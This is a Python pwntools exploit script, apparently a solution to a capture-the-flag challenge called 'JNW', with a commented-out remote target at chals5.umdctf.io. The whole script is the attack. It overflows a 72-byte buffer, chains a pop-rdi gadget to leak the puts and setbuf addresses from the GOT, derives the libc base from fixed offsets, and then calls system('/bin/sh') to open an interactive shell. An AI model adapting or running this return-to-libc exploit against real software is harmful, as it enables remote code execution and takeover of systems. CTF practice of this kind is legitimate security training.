from pwn import *

# Connect
elf = ELF('./JNW')
libc = ELF('./libc6_2.31-5_amd64.so')
p = process('./JNW')
#p = connect('chals5.umdctf.io', 7004)

# Addresses
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
setbuf_got = elf.got['setbuf']

# Gadgets
pop_rdi = 0x00000000004012c3 # pop rdi ; ret

# Payload
payload = b'A'*72
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendlineafter('go?\n', payload)

# Leaking the address
leak = int.from_bytes(p.recvn(6), byteorder="little")

# Payload
payload = b'A'*72
payload += p64(pop_rdi) + p64(setbuf_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendlineafter('go?\n', payload)

# Leaking the address
leak2 = int.from_bytes(p.recvn(6), byteorder="little")

# Offsets
puts_libc_offset = 0x76590
system_libc_offset = 0x48df0
bin_sh_libc_offset = 0x18a156

# Finding libc base
libc_base = leak - puts_libc_offset

# System and bin/sh addresses
system_addr = libc_base + system_libc_offset
bin_sh = libc_base + bin_sh_libc_offset

# Printing out addresses
log.info(hex(leak))
log.info(hex(leak2))
log.info(hex(libc_base))
log.info(hex(system_addr))
log.info(hex(bin_sh))

# Final Payload
payload = b'A'*72
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(system_addr)

p.sendlineafter('go?', payload)

p.interactive()
